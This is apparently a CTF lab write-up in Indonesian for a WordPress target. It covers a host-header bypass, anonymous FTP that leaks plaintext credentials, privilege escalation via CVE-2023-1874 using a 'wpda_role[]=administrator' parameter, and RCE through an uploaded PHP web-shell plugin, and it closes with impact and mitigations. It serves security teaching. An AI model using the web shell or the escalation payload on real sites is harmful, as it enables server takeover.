[[Remote Code Execution (RCE)]] | [[CVE-2023-1874]]

- [[#1 Kerentanan yang Ditemukan|1 Kerentanan yang Ditemukan]]
	- [[#1 Kerentanan yang Ditemukan#1.1 Virtual Host / Host Header Misconfiguration|1.1 Virtual Host / Host Header Misconfiguration]]
	- [[#1 Kerentanan yang Ditemukan#1.2 FTP Anonymous / Unauthenticated Access dengan Credential Leakage|1.2 FTP Anonymous / Unauthenticated Access dengan Credential Leakage]]
	- [[#1 Kerentanan yang Ditemukan#1.3 Privilege Escalation via WP Data Access Plugin (CVE-2023-1874)|1.3 Privilege Escalation via WP Data Access Plugin (CVE-2023-1874)]]
	- [[#1 Kerentanan yang Ditemukan#1.4 Remote Code Execution (RCE) via Malicious WordPress Plugin Upload|1.4 Remote Code Execution (RCE) via Malicious WordPress Plugin Upload]]
- [[#2 Langkah Pengerjaan|2 Langkah Pengerjaan]]
	- [[#2 Langkah Pengerjaan#2.1 Step 1 - Konfigurasi Akses Domain (Virtual Host Bypass)|2.1 Step 1 - Konfigurasi Akses Domain (Virtual Host Bypass)]]
	- [[#2 Langkah Pengerjaan#2.2 Step 2 - Reconnaissance|2.2 Step 2 - Reconnaissance]]
		- [[#2.2 Step 2 - Reconnaissance#2.2.1 Nmap Scan|2.2.1 Nmap Scan]]
		- [[#2.2 Step 2 - Reconnaissance#2.2.2 WPScan|2.2.2 WPScan]]
	- [[#2 Langkah Pengerjaan#2.3 Step 3 - FTP Enumeration & Credential Discovery|2.3 Step 3 - FTP Enumeration & Credential Discovery]]
	- [[#2 Langkah Pengerjaan#2.4 Step 4 - Login WordPress|2.4 Step 4 - Login WordPress]]
	- [[#2 Langkah Pengerjaan#2.5 Step 5 - Privilege Escalation via CVE-2023-1874|2.5 Step 5 - Privilege Escalation via CVE-2023-1874]]
	- [[#2 Langkah Pengerjaan#2.6 Step 6 - Remote Code Execution via Malicious Plugin Upload|2.6 Step 6 - Remote Code Execution via Malicious Plugin Upload]]
	- [[#2 Langkah Pengerjaan#2.7 Step 7 - Flag Retrieval|2.7 Step 7 - Flag Retrieval]]
- [[#3 Dampak|3 Dampak]]
- [[#4 Mitigasi|4 Mitigasi]]


| Detail | Keterangan |
| :--- | :--- |
| **IP Target** | 192.168.100.22 |
| **Domain** | unnoticedpath.netics |
| **Difficulty** | **Easy** |
| **Author** | Kadek Fajar Pramartha Yasodana |

## 1 Kerentanan yang Ditemukan

### 1.1 Virtual Host / Host Header Misconfiguration
Server hanya merespons dengan konten yang benar apabila request menggunakan `Host` header yang sesuai (`unnoticedpath.netics`). Ketika diakses langsung menggunakan IP address, server tidak mengembalikan halaman yang diharapkan. Ini merupakan konfigurasi virtual host yang tidak diproteksi dengan tepat dan dapat disiasati dengan memodifikasi header `Host` pada setiap request.

### 1.2 FTP Anonymous / Unauthenticated Access dengan Credential Leakage
Port FTP (21) terbuka pada target dan dapat diakses tanpa autentikasi yang memadai. Di dalamnya terdapat folder `backups` yang menyimpan file-file email. Salah satu email mengandung credential plaintext milik akun WordPress.

### 1.3 Privilege Escalation via WP Data Access Plugin (CVE-2023-1874)

> **CVE:** CVE-2023-1874 | **CVSS Score:** **8.8 (High)** | **Affected:** WP Data Access <= 5.3.7

Plugin **WP Data Access** versi rentan memiliki celah *Privilege Escalation*. Ketika pengguna memperbarui profil, plugin tidak melakukan validasi yang memadai terhadap parameter `wpda_role[]`. Akibatnya, pengguna dengan role rendah (Subscriber/Contributor) dapat mengubah role-nya sendiri menjadi Administrator hanya dengan menyisipkan parameter tambahan pada request HTTP.

### 1.4 Remote Code Execution (RCE) via Malicious WordPress Plugin Upload
Setelah mendapatkan akses Administrator WordPress, penyerang dapat mengunggah plugin PHP arbitrer melalui fitur **Plugins > Add New > Upload Plugin**. Plugin berbahaya yang berisi fungsi `system()` memungkinkan eksekusi perintah OS secara langsung melalui parameter GET/POST, yang mengakibatkan Remote Code Execution (RCE) penuh pada server.

## 2 Langkah Pengerjaan

### 2.1 Step 1 - Konfigurasi Akses Domain (Virtual Host Bypass)
Saat mengakses `http://192.168.100.22` melalui browser, server menampilkan informasi bahwa domain sesungguhnya adalah `unnoticedpath.netics`. Namun, mengakses domain tersebut secara langsung gagal karena tidak ada entri DNS publik.

![[1-wp.png]]

**Solusi:** Menambahkan entri pada *Hostname Resolution Overrides* Burp Suite:

| Hostname | IP Address |
| :--- | :--- |
| `unnoticedpath.netics` | `192.168.100.22` |

![[1-dns.png]]

Setelah host resolve diarahkan ke IP `192.168.100.22`, akses web akan menampilkan portal.

![[1-wp.png]]

### 2.2 Step 2 - Reconnaissance

#### 2.2.1 Nmap Scan
Eksplorasi awal (*reconnaissance*) dilakukan dengan memindai port yang terbuka menggunakan Nmap untuk memetakan *attack surface* target secara utuh.

```bash
nmap 192.168.100.22
```

**Hasil temuan:**
* Port **21/tcp** - Layanan FTP terbuka. FTP port yang dibiarkan terekspos tanpa autentikasi ketat seringkali mendatangkan akses *login anonymous*.
* Port **80/tcp** - Layanan HTTP terbuka yang difungsikan untuk web portal berbasis CMS WordPress.

![[1-nmap.png]]

#### 2.2.2 WPScan
Mengetahui eksistensi WordPress pada port 80, proses enumerasi spesifik dilanjutkan via WPScan untuk menyingkap plugin rentan yang dapat dieksploitasi.

```bash
wpscan --url [http://unnoticedpath.netics](http://unnoticedpath.netics)
```

![[1-wpscan.png]]

**Hasil temuan kritis:**
* Plugin **WP Data Access** terdeteksi dalam versi rentan terhadap *Privilege Escalation*.
* Username akun terdaftar `devtest` berhasil dienumerasi. Kombinasi plugin rentan dan bocornya username menjadi leverage esensial di fase eksploitasi pasca-autentikasi.

### 2.3 Step 3 - FTP Enumeration & Credential Discovery
Berdasarkan temuan Nmap bahwa port FTP (21) terbuka, dilakukan koneksi langsung ke layanan tersebut. Platform FTP yang tidak mengaktifkan proteksi *anonymous login* membuka peluang masuk tanpa kredensial apapun.

```bash
ftp 192.168.100.22
```

Akses berhasil. Setelah navigasi file system target, ditemukan folder `backups` yang berisi 5 file email. Salah satu file secara fatal menyimpan kredensial akun `devtest` dalam format *plaintext*:

```text
URL:      http://unnoticedpath.netics
Username: devtest
Password: v7N#3PZcg$7kpkOjwmeJW1dA
```

![[1-ftp.png]]

### 2.4 Step 4 - Login WordPress
Kredensial yang diperoleh dari direktori `backups` digunakan untuk masuk ke portal administrasi WordPress di `http://unnoticedpath.netics/wp-login.php`.

* **Username:** `devtest`
* **Password:** `v7N#3PZcg$7kpkOjwmeJW1dA`

Otentikasi berhasil, namun role yang teralokasi hanya sebatas **Subscriber** - level privilege terendah yang tidak dapat menjangkau fungsi administrasi infrastruktur WordPress. Hal ini menjembatani langkah eskalasi privilege di Step 5.

![[1-subs.png]]

### 2.5 Step 5 - Privilege Escalation via CVE-2023-1874
Plugin WP Data Access membaca parameter `wpda_role[]` dari request tanpa validasi otorisasi.

**Langkah eksploitasi:**
1. Buka halaman **Profile** di WordPress dashboard.
2. Aktifkan Burp Suite dan intercept request saat menekan tombol **Update Profile**.
3. Pada request yang ter-intercept, tambahkan parameter berikut di body request:

```text
&wpda_role[]=administrator
```

![[1-admin.png]]

4. Forward request tersebut.

Setelah di-refresh, akun `devtest` kini memiliki role **Administrator**.

![[1-adminn.png]]

### 2.6 Step 6 - Remote Code Execution via Malicious Plugin Upload
Dengan akses Administrator, penyerang dapat mengunggah plugin PHP arbitrer. Kelemahan ini dieksploitasi dengan menyisipkan kode `system()` ke dalam file plugin yang kemudian dieksekusi oleh mesin WordPress.

**Komposisi file plugin berbahaya (`plugin.php`):**

```php
<?php
/**
 * Plugin Name: cmd-hook
 * Description: RCE via WordPress Init Hook
 * Version: 2.0
 * Author: Pentester
 */
add_action('init', function() {
    if (isset($_REQUEST['cmd'])) {
        echo "<pre>";
        system($_REQUEST['cmd']);
        echo "</pre>";
        die();
    }
});
?>
```

**Langkah:**
1. Buat file `plugin.php` dengan konten di atas.
2. Kompres menjadi `hook.zip`.
3. Navigasi ke **Plugins > Add New > Upload Plugin**.
4. Upload file `hook.zip` dan aktifkan plugin.

![[1-plugin.png]]

**Verifikasi RCE:**
```text
http://unnoticedpath.netics/?cmd=id
```

![[1-id.png]]

### 2.7 Step 7 - Flag Retrieval
Setelah mendapatkan RCE, dilakukan enumerasi direktori root untuk menemukan file flag:

```text
http://unnoticedpath.netics/?cmd=ls /
```

![[1-ls-root.png]]

Ditemukan file:
```text
flag-dc7910eb-f6f7-4260-87f9-52091aac9b2b-netics.txt
```

Isi flag dibaca menggunakan perintah `cat`:
```text
http://unnoticedpath.netics/?cmd=cat /flag-dc7910eb-f6f7-4260-87f9-52091aac9b2b-netics.txt
```

![[1-cat-falg.png]]

> **`NETICS{wordpress_cve_master_dc7910eb-f6f7-4260-87f9-52091aac9b2b}`**

## 3 Dampak

| Kerentanan | Dampak |
| :--- | :--- |
| Virtual Host Bypass | Penyerang dapat mengakses aplikasi yang seharusnya tidak diekspos secara publik. |
| FTP Credential Leakage | Credential pengguna terekspos, memungkinkan *unauthorized access*. |
| Privilege Escalation (CVE-2023-1874) | Pengguna dengan hak rendah dapat meningkatkan privilege menjadi Administrator. |
| RCE via Plugin Upload | Penyerang memiliki kendali penuh atas server - baca/ubah data, pivot ke sistem lain, instalasi backdoor. |

## 4 Mitigasi

1. **Virtual Host Misconfiguration**
   Pastikan server hanya merespons request dari domain yang valid. Konfigurasi default virtual host agar tidak membocorkan informasi domain internal.

2. **FTP Access & Credential Leakage**
   Nonaktifkan layanan FTP jika tidak diperlukan; gunakan SFTP/SCP sebagai alternatif. Jangan simpan credential dalam bentuk plaintext pada file backup. Terapkan autentikasi yang kuat dan batasi akses FTP hanya untuk IP tertentu.

3. **CVE-2023-1874 - WP Data Access Privilege Escalation**
   Update plugin **WP Data Access** ke versi >= 5.3.8. Terapkan prinsip *least privilege* pada setiap akun WordPress. Referensi patch: [Wordfence CVE-2023-1874](https://www.wordfence.com/threat-intel/vulnerabilities/id/CVE-2023-1874)

4. **RCE via Malicious Plugin Upload**
   Batasi upload plugin hanya untuk administrator terpercaya. Implementasikan allowlist tipe file dan validasi konten plugin. Gunakan Web Application Firewall (WAF) dan terapkan monitoring pada aktivitas plugin WordPress.